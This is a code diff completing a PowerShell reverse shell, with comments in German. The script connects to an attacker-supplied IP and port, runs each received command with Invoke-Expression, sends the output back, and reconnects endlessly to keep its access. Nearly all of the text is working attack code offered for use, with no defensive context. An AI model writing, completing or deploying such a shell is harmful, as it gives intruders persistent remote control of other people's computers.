@@ -1,12 +1,13 @@
 # PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
 # Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
-# Enthält Reconnect-Logik und Logging.
+# Enthält Reconnect-Logik und Logging.'
+# New
 
 # --- KONFIGURATION START ---
 Param(
     [Parameter(Mandatory=$true)] # Macht die Angabe von -ip Pflicht
     [string]$ip,                 # IP-Adresse des Angreifers/Listeners
-    
+
     [Parameter(Mandatory=$true)] # Macht die Angabe von -port Pflicht
     [int]$port                   # Port des Listeners
 )
@@ -71,6 +72,36 @@ function Start-ReverseShell {
                     # Führe den Befehl aus und fange sowohl Standard-Output als auch Fehler ab
                     $output = Invoke-Expression $command 2>&1 | Out-String;
                     Write-Log "Command executed. Output length: $($output.Length)."
-                    
+
                     # Sende die Ausgabe zurück zum Listener
-                    $sw
+                    $sw.WriteLine($output + (Get-Location).Path + "> "); # Füge den aktuellen Pfad und Prompt hinzu
+                    $sw.Flush();
+                }
+                Start-Sleep -Milliseconds $sleepTimeMs # Kurze Pause, um CPU-Auslastung zu reduzieren
+            } catch {
+                Write-Log "Error in main loop: $($_.Exception.Message)"
+                break; # Verbindung verloren oder anderer Fehler in der Schleife
+            }
+        }
+        Write-Log "Main loop ended. Client connected: $($client.Connected)."
+
+    } catch {
+        # Dieser Block fängt Fehler beim Verbindungsaufbau oder während des Shell-Betriebs ab
+        Write-Log "Shell attempt failed: $($_.Exception.Message)"
+    } finally {
+        # Aufräumen: Schließe alle offenen Ressourcen
+        Write-Log "Attempting cleanup."
+        if($client -and $client.Connected) {
+            try { $client.Close(); Write-Log "Client closed." } catch { Write-Log "Error closing client: $($_.Exception.Message)" }
+        }
+        Write-Log "Shell attempt finished."
+    }
+}
+
+# --- Endlosschleife für Reconnect-Logik ---
+Write-Log "Starting persistent reverse shell loop."
+while ($true) {
+    Start-ReverseShell -ip $ip -port $port
+    Write-Log "Disconnected. Reconnecting in ${reconnectDelaySec} seconds..."
+    Start-Sleep -Seconds $reconnectDelaySec
+}
